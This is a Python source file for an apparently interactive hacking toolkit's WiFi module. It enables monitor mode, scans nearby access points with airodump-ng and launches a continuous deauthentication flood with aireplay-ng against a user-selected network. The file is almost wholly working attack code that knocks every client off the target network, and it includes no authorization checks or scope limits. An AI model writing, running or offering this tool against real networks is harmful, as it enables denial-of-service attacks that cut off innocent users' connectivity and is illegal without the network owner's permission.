import subprocess
import os
import pty
import sys
import csv
import time
import shutil
from datetime import datetime

from utils import banner

active_wireless_network = []


def check_for_essid(essid, lst):
    if not essid:
        return False
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in (item["ESSID"] or ""):
            return False
    return True


def backup_stray_csv_files():
    if not any(".csv" in f for f in os.listdir()):
        return
    banner.info("archiving scan .csv files to backup_files/")
    directory = os.getcwd()
    try:
        os.mkdir(directory + "/backup_files")
    except FileExistsError:
        pass
    for file in os.listdir():
        if ".csv" in file:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            shutil.move(file, f"{directory}/backup_files/{timestamp}-{file}")


def detect_wireless_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for block in result.stdout.split("\n\n"):
        block = block.strip()
        if not block or "no wireless extensions" in block:
            continue
        name = block.splitlines()[0].split()[0]
        interfaces.append(name)
    return interfaces


def select_interface():
    banner.module_banner("wifi")
    banner.section("select a wireless interface", accent=banner.C.CYAN)

    banner.box(
        [
            f"{banner.C.WARN}adapter must support BOTH monitor mode AND packet injection{banner.C.RESET}",
            "many built-in laptop wifi chips support monitor mode but not injection.",
            f"check with: {banner.C.WHITE}aireplay-ng --test <interface>{banner.C.RESET}",
        ],
        title="⚠ hardware requirement",
        accent=banner.C.WARN,
    )

    interfaces = detect_wireless_interfaces()
    if len(interfaces) == 0:
        banner.error("no wireless adapter found, please connect one and try again")
        raise banner.BackToMenu()

    print()
    lines = [f"{banner.C.CYAN}[{index}]{banner.C.RESET} {item}" for index, item in enumerate(interfaces, start=1)]
    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")
    banner.box(lines, title="available interfaces", accent=banner.C.CYAN)

    while True:
        choice = banner.prompt("interface", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        try:
            index = int(choice) - 1
            if index < 0:
                raise IndexError
            return interfaces[index]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def find_monitor_interface(fallback):
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    for block in result.stdout.split("\n\n"):
        block = block.strip()
        if "Mode:Monitor" in block:
            return block.splitlines()[0].split()[0]
    return fallback + "mon"


def prepare_monitor_mode(interface):
    banner.module_banner("wifi")
    banner.section("preparing monitor mode", accent=banner.C.CYAN)
    banner.info(f"killing conflicting processes on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    banner.info(f"enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    time.sleep(1)

    mon_interface = find_monitor_interface(interface)
    banner.ok(f"monitor mode ready on {mon_interface}")
    return mon_interface


SCAN_DURATION = 30  


def _render_scan_screen(elapsed, tick, prev_lines):
    banner.rewind(prev_lines)
    bar_width = max(10, min(32, banner.width() - 24))
    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
    bar = banner.progress_bar(elapsed, SCAN_DURATION, bar_width=bar_width, accent=banner.C.CYAN)
    remaining = max(0, round(SCAN_DURATION - elapsed))

    lines = [
        f"{spin}  {bar}",
        f"{remaining:>2}s left  ·  {len(active_wireless_network)} access point(s) found",
        "",
        f"{'essid':<24}{'bssid':<20}{'ch':<5}{'speed'}",
        f"{'-----':<24}{'-----':<20}{'--':<5}{'-----'}",
    ]
    for item in active_wireless_network:
        speed = (item.get("Speed") or "").strip()
        speed_display = f"{speed}Mb/s" if speed else "-"
        essid = (item["ESSID"] or "").strip()
        if len(essid) > 22:
            essid = essid[:21] + "…"
        channel = (item.get("channel") or "").strip()
        lines.append(f"{essid:<24}{item['BSSID']:<20}{channel:<5}{speed_display}")
    if not active_wireless_network:
        lines.append(f"{banner.C.MUTED}no access points found yet...{banner.C.RESET}")
    lines.append("")
    lines.append(f"{banner.C.MUTED}press ctrl+c to stop early{banner.C.RESET}")

    return banner.box(
        lines,
        title="scanning for access points",
        accent=banner.C.CYAN,
    )


def _render_results_screen(prev_lines):
    banner.rewind(prev_lines)

    lines = [
        f"{'no':<4}{'bssid':<20}{'ch':<5}{'speed':<9}{'essid'}",
        f"{'--':<4}{'-----':<20}{'--':<5}{'-----':<9}{'-----'}",
    ]
    for index, item in enumerate(active_wireless_network):
        speed = (item.get("Speed") or "").strip()
        speed_display = f"{speed}Mb/s" if speed else "-"
        lines.append(f"{index:<4}{item['BSSID']:<20}{item['channel'].strip():<5}{speed_display:<9}{item['ESSID']}")

    if not active_wireless_network:
        lines.append(f"{banner.C.MUTED}no access points found{banner.C.RESET}")

    lines.append("")
    lines.append(f"{banner.C.CYAN}[r]{banner.C.RESET} scan again")
    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")

    return banner.box(lines, title="access points found", accent=banner.C.CYAN)


def scan_networks(interface):
    fieldnames = ["BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed", "Privacy",
                  "Cipher", "Authentication", "Power", "beacons", "IV", "LAN_IP", "ID_length",
                  "ESSID", "Key"]

    banner.module_banner("wifi")
    banner.section("scanning for access points", accent=banner.C.CYAN)
    prev_lines = 0

    scan_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv",
         interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    start = time.monotonic()
    tick = 0
    early_exit_output = None

    try:
        while True:
            elapsed = time.monotonic() - start

            for file in os.listdir():
                if ".csv" in file:
                    with open(file) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] in (None, "BSSID"):
                                continue
                            if check_for_essid(row["ESSID"], active_wireless_network):
                                active_wireless_network.append(row)

            prev_lines = _render_scan_screen(elapsed, tick, prev_lines)
            tick += 1

            if elapsed >= SCAN_DURATION:
                break
            if scan_proc.poll() is not None:
                early_exit_output = scan_proc.stdout.read().strip() if scan_proc.stdout else ""
                break

            time.sleep(0.4)
    except KeyboardInterrupt:
        pass
    finally:
        if scan_proc.poll() is None:
            scan_proc.terminate()

    _render_results_screen(prev_lines)
    banner.ok(f"scan complete, found {len(active_wireless_network)} network(s)")

   
    if early_exit_output is not None:
        banner.warn("airodump-ng exited before the scan timer finished")
        if early_exit_output:
            for line in early_exit_output.splitlines()[-5:]:
                banner.error(line)
        else:
            banner.info("(it exited with no output — likely killed by a signal, e.g. an early ctrl+c)")


def select_target(mon_interface):
    while True:
        choice = banner.prompt("target", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        if choice.lower() in ("r", "rescan"):
            active_wireless_network.clear()
            scan_networks(mon_interface)
            continue
        try:
            return active_wireless_network[int(choice)]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def launch_attack(mon_interface, target):
    banner.module_banner("wifi")
    banner.section("launching deauthentication attack", accent=banner.C.CYAN)
    channel = target["channel"].strip()
    bssid = target["BSSID"]

    print(f"  target essid  : {target['ESSID']}")
    print(f"  target bssid  : {bssid}")
    print(f"  channel       : {channel}")
    banner.countdown(3, "attacking")
    subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel])

    banner.module_banner("wifi")
    banner.section("deauthentication attack running", accent=banner.C.CYAN)
    print(f"  target essid  : {target['ESSID']}")
    print(f"  target bssid  : {bssid}")
    print(f"  channel       : {channel}")
    print()
    banner.info("sending deauth frames... (press ctrl+c to stop)")
    print()

    sys.stdout.flush()
    master_fd, slave_fd = pty.openpty()
    attack_proc = subprocess.Popen(
        ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True,
    )
    os.close(slave_fd)

    try:
        while True:
            try:
                chunk = os.read(master_fd, 4096)
            except OSError:
                break  
            if not chunk:
                break
            os.write(1, chunk)
    except KeyboardInterrupt:
        pass
    finally:
        if attack_proc.poll() is None:
            attack_proc.terminate()
        attack_proc.wait()
        os.close(master_fd)

    banner.warn("deauthentication attack stopped")


def run():
    backup_stray_csv_files()
    try:
        interface = select_interface()
        mon_interface = prepare_monitor_mode(interface)
        scan_networks(mon_interface)
        target = select_target(mon_interface)
        launch_attack(mon_interface, target)
    finally:
        backup_stray_csv_files()


if __name__ == "__main__":
    try:
        run()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        print()
        banner.warn("aborted")
